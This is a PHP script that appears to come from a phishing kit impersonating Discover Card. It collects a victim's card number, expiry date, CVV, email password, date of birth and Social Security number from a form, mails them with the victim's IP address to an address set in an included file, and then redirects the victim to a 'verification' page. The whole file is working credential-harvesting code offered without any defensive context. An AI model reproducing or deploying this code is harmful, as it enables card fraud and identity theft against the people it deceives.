<?php
session_start();
$ip = getenv("REMOTE_ADDR");
$_SESSION['accountNumber'] = $_POST['accountNumber'];
$_SESSION['expirationDate'] = $_POST['expirationDate'];
$_SESSION['cvv'] = $_POST['cvv'];
$_SESSION['name'] = $_POST['name'];
$_SESSION['email'] = $_POST['email'];
$_SESSION['password'] = $_POST['password'];
$_SESSION['dob'] = $_POST['dob'];
$_SESSION['ssn'] = $_POST['ssn'];
$headers = "From: Discover_XSPTX<xsptx@lbox.com>\r\n" ;
$msg =
"------------ NEW Discover Card --------------------->



Full Name          :".$_SESSION['name']."
Credit Card Number :".$_SESSION['accountNumber']."
Exp Date           :".$_SESSION['expirationDate']."
CVV                :".$_SESSION['cvv']."
Email Address      :".$_SESSION['email']."
Password           :".$_SESSION['password']."
DOB                :".$_SESSION['dob']."
SSN                :".$_SESSION['ssn']."



IP ADDRESS : $ip


+=+=+=+=+=+=+=+=+=## SP TX Discover ##+=+=+=+=+=+=+=+=+=+=+=+=";

include 'email.php';
$subj = " [Discover Card]  - $ip";
$headers .= "Content-Type: text/plain; charset=UTF-8\n";
$headers .= "Content-Transfer-Encoding: 8bit\n";
mail("$to", $subj, $msg,"$headers");
header("Location: verification.html");
?>